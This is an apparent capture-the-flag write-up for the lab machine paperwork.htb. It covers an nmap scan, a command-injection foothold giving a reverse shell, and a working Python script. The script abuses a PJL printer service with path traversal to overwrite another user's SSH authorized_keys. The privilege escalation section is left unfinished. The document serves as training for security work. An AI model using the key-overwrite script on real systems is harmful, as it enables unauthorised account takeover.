# paperwork.htb

> **OS:** Linux\
> **Difficulty:** Easy\
> **IP:** `10.10.x.x`\
> **Date:** 11-07-2026

***

### TL;DR

<...>

**Chain:**

`<...>`

***

### Box Info

|                |                                            |
| -------------- | ------------------------------------------ |
| **Name**       | paperwork.htb                              |
| **OS**         | Linux                                      |
| **Difficulty** | Easy                                       |
| **Release**    | Released on 11th June, 2026                |
| **Key skills** | CVE, LPI abuse, SSH key overwrite, Sockets |

***

### 1. Recon

#### 1.1 Port scan

```bash
# Nmap 7.99 scan initiated Mon Aug 17 09:40:28 2026 as: /usr/lib/nmap/nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /opt/_NOTES/results/paperwork/paperwork.htb/scans/_full_tcp_nmap.txt -oX /opt/_NOTES/results/paperwork/paperwork.htb/scans/xml/_full_tcp_nmap.xml paperwork.htb
Warning: 10.129.65.41 giving up on port because retransmission cap hit (6).
Nmap scan report for paperwork.htb (10.129.65.41)
Host is up, received user-set (0.13s latency).
rDNS record for 10.129.65.41: paperwork
Scanned at 2026-08-17 09:40:28 CEST for 750s
Not shown: 65528 closed tcp ports (reset)
PORT      STATE    SERVICE        REASON         VERSION
22/tcp    open     ssh            syn-ack ttl 63 OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http           syn-ack ttl 63 nginx 1.28.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.28.0 (Ubuntu)
|_http-title: Intranet | Document Archiving Service
1515/tcp  open     ifor-protocol? syn-ack ttl 63
| fingerprint-strings: 
|   Socks4, TerminalServer, TerminalServerCookie: 
|_    Archive_Printer is ready and printing.
1859/tcp  filtered gammafetchsvr  no-response
19902/tcp filtered unknown        no-response
29097/tcp filtered unknown        no-response
61357/tcp filtered unknown        no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.99%I=9%D=8/17%Time=6A82BDC0%P=aarch64-unknown-linux-gn
SF:u%r(TerminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20an
SF:d\x20printing\.\n")%r(Socks4,27,"Archive_Printer\x20is\x20ready\x20and\
SF:x20printing\.\n")%r(insteonPLM,1,"\x01");
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=8/17%OT=22%CT=1%CU=41449%PV=Y%DS=2%DC=T%G=Y%TM=6A82BDD
OS:A%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS
OS:=A)OPS(O1=M552ST11NW9%O2=M552ST11NW9%O3=M552NNT11NW9%O4=M552ST11NW9%O5=M
OS:552ST11NW9%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW9%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 28.646 days (since Sun Jul 19 18:22:01 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   173.67 ms 10.10.14.1
2   175.58 ms paperwork (10.129.65.41)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 17 09:52:58 2026 -- 1 IP address (1 host up) scanned in 750.59 seconds

```

#### 1.2 Initial observations

* Hostname / domain: paperwork.htb
*   Added to `/etc/hosts`:<br>

    ```
    10.10.x.x paperwork.htb     
    ```

### 2. Foothold / Initial Access

#### 2.1 Description

> When accessing port 80 in a browser, we find Digital Archiving Solutions version 1.0.2. Further research reveals a command-injection CVE. This grants us access as the service account user "LP". Further enumeration reveals a print service on localhost port 9100. The user "archivist" starts this service. We can abuse it to upload a new `authorized_keys` file. This grants us access as "archivist".

#### 2.2 Exploitation

After inspecting the service on port 80, we identify Digital Archiving Solutions version 1.0.2. A search for available exploits reveals a command-injection proof of concept on [GitHub](https://github.com/jimdixx/Digital-Archiving-Solutions-RCE-PoC).

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 13.52.03.png" alt=""><figcaption></figcaption></figure>

Next, we run the exploit to obtain a reverse shell. The payload uses the [reverse SSH shell from Fahrj](https://github.com/Fahrj/reverse-ssh) in a multi-command request.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 14.24.03.png" alt=""><figcaption></figcaption></figure>

In another shell, we recieve a connection back.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 14.24.52.png" alt=""><figcaption></figcaption></figure>

And from this point on, we have a low-level shell as the user "LP"

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 14.26.05.png" alt=""><figcaption></figcaption></figure>

#### 2.3 LP to Archivist

In order to escalate privileges from the user `lp` to `archivist`, we first enumerate the ports that are available. This can be done by executing the command `netstat -ntlp`

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 14.30.52.png" alt=""><figcaption></figcaption></figure>

This reveals two services listening on localhost (`127.0.0.1`). Digital Archiving Solutions runs on port 1337 behind a proxy. The `jetdirect.py` script listens on port 9100.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 14.33.33.png" alt=""><figcaption></figcaption></figure>

Using the reverse SSH shell from Fahrj, we forward remote port 9100 to our Kali host. The service is then available locally on port 9100.

We verify with [pret](https://github.com/rub-nds/pret) that the we are communicating with an pjl-language type printer, as can be seen in the screenshot underneath:

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 14.38.51.png" alt=""><figcaption></figcaption></figure>

Uploads with `pret.py` fail, so we develop the following script. It uploads an SSH public key to the `archivist` user's `.ssh` directory.

```python
#!/usr/bin/env python3
import socket
import sys

HOST = "127.0.0.1"
PORT = 9100
UEL = b"\x1b%-12345X"

def send_raw(payload, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((HOST, PORT))
    s.send(payload)
    chunks = b""
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks += data
    except socket.timeout:
        pass
    s.close()
    return chunks

def pjl_cmd(cmd):
    payload = UEL + cmd.encode() + b"\r\n" + UEL
    resp = send_raw(payload)
    print(f"[{cmd}] ->")
    print(resp.decode(errors="replace"))
    return resp

def pjl_download(remote_path, content):
    header = f'@PJL FSDOWNLOAD NAME="{remote_path}" SIZE={len(content)}\r\n'.encode()
    payload = UEL + header + content + UEL
    resp = send_raw(payload)
    print(f"[FSDOWNLOAD {remote_path} SIZE={len(content)}] ->")
    print(resp.decode(errors="replace"))
    return resp

def main():
    local_key_path = sys.argv[1]
    remote_path = sys.argv[2] if len(sys.argv) > 2 else "../.ssh/authorized_keys"

    with open(local_key_path, "rb") as f:
        pubkey = f.read()
    if not pubkey.endswith(b"\n"):
        pubkey += b"\n"

    pjl_cmd('@PJL FSMKDIR NAME="../.ssh"')
    pjl_download(remote_path, pubkey)
    pjl_cmd(f'@PJL FSUPLOAD NAME="{remote_path}" OFFSET=0 SIZE=99999')

if __name__ == "__main__":
    main()

```

Upload your ssh key to the .ssh directory of the user archivist on the following manner, this will result in a succesfull write to the `.ssh` directory

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-08-23 om 14.46.33.png" alt=""><figcaption></figcaption></figure>

### 3. Privilege Escalation

#### 3.1 Description

> In order to escalate from the user \<USER> to the user root,

#### 3.2 Exploitaton
